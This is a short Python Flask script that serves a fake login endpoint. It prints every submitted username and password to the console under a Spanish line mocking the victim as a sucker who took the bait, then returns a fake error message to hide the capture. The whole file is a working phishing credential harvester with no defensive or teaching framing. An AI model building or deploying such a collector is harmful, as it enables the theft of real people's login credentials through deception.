from flask import Flask, escape, session, request, Response, redirect, url_for, render_template

app = Flask(__name__)

@app.route("/validateLogin", methods=['GET', 'POST'])
def validarLogin():
    if request.method == 'POST':
        user = request.form['user']
        password = request.form['pass']
        print("Un pardillo ha picado: ")
        print("user: " + user)
        print("pass: " + password)
        print("------------------------")
    return "There was an error, try again later"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port='5005')

